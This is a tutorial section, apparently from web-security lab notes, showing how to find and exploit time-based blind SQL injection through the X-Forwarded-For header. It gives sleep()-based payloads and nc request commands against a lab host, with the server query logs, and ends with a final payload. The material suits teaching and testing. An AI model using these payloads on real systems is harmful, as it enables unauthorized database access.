#### 7.1. Intro

Some HTTP headers:
```
Host:
User-Agent:
X-Forwarded-Host:
X-Forwarded-For:
```
(get client-ip when app is behind reverse-proxy; used instead of $_SERVER['REMOTE_ADDR'])

Sending raw HTTP requests via nc:
```
$ echo -e "HEAD / HTTP/1.0\r\nConnection: close\r\n" | nc vuln.loc 80
$ echo -e "HEAD / HTTP/1.0\r\nHost: vuln.loc\r\nConnection: close\r\n" | nc vuln.loc 80
```

Notes:
  - General pessimistic-injection-approach (BLIND):
  
    1. default : inj=true_conditionA
  
    2. modified: inj=[false_conditionA OR true_conditionB AND ]true_conditionA
  
          * false_conditionA has the same format as true_conditionA
          
          * forces evaluation on true_conditionB => true_conditionB AND true_conditionA
          
  - BLIND payloads:
    * `car' or sleep(4)#`
    * `car' or sleep(0)-- -`
    * `car' or sleep(4) and '1'='1`
    * `car' or sleep(0) and '1'='1`

#### 7.2. Looking for Blind-SQLi in `X-Forwarded-For` header

Regular usage
```
$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: test123\r\nConnection: close\r\n" | nc vuln.loc 80
Query	SELECT * FROM stats where ip='test123'
Query	INSERT INTO stats (ip, count) VALUES ('test123',1)
```

Error based detection won't work here (break SQL query with meta-character `'`)
```
$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: abcd'\r\nConnection: close\r\n" | nc vuln.loc 80
Query	SELECT * FROM stats where ip='abcd''
```

`false OR true` query (returns true)
```
$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: $RANDOM' or '1'='1\r\nConnection: close\r\n" | nc vuln.loc 80
Query	SELECT * FROM stats where ip='23111' or '1'='1'
Query	UPDATE stats set count=count+1 where ip='23111' or '1'='1'
```

`false AND false` query (returns false)
```
$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: $RANDOM' and '6'='7\r\nConnection: close\r\n" | nc vuln.loc 80
Query	SELECT * FROM stats where ip='25507' and '6'='7'
Query	INSERT INTO stats (ip, count) VALUES ('25507' and '6'='7',1)
```

`inj=false_condition or sleep(x) and true_condition` (evaluated as true)
```
$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: $RANDOM' or sleep(1) and '7'='7\r\nConnection: close\r\n" | nc vuln.loc 80
Query	SELECT * FROM stats where ip='1815' or sleep(1) and '7'='7'
Query	INSERT INTO stats (ip, count) VALUES ('1815' or sleep(1) and '7'='7',1)
```

Repeat previous attack with `sleep(0)`
```
$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: $RANDOM' or sleep(0) and '7'='7\r\nConnection: close\r\n" | nc vuln.loc 80
Query	SELECT * FROM stats where ip='2075' or sleep(0) and '7'='7'
Query	INSERT INTO stats (ip, count) VALUES ('2075' or sleep(0) and '7'='7',1)
```

Final payload
```
$ echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: abc' or sleep(4)#Connection: close\r\n" | nc vuln.loc 80
```
